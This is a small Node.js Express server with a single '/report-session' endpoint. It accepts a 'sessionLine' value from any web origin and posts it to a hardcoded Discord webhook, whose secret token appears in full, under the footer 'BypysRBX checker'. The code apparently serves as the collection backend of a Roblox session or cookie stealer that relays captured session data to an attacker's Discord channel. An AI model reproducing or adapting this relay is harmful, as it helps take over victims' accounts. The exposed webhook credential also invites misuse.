const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3001;

const DISCORD_WEBHOOK =
 'https://discord.com/api/webhooks/1458280504502784123/Jie5d0xI0a-nDRMa50fjXKacIl3_o3omg0vBBUs0RR8WRNiOajl3W9kfTYu_vqMNNUD5';

app.use(cors());
app.use(express.json());

app.post('/report-session', async (req, res) => {
 try {
 const text = String(req.body?.sessionLine || '').trim();

 if (!text) {
 return res.status(400).json({ error: 'Empty message' });
 }

 await axios.post(DISCORD_WEBHOOK, {
 embeds: [
 {
 title: '📩 New message',
 description: text,
 color: 5814783,
 footer: {
 text: 'BypysRBX checker'
 },
 timestamp: new Date().toISOString()
 }
 ]
 });

 res.json({ ok: true });

 } catch (err) {
 console.error(err);
 res.status(500).json({ error: 'Discord error' });
 }
});

app.listen(PORT, () => {
 console.log('✅ Server running on port ' + PORT);
});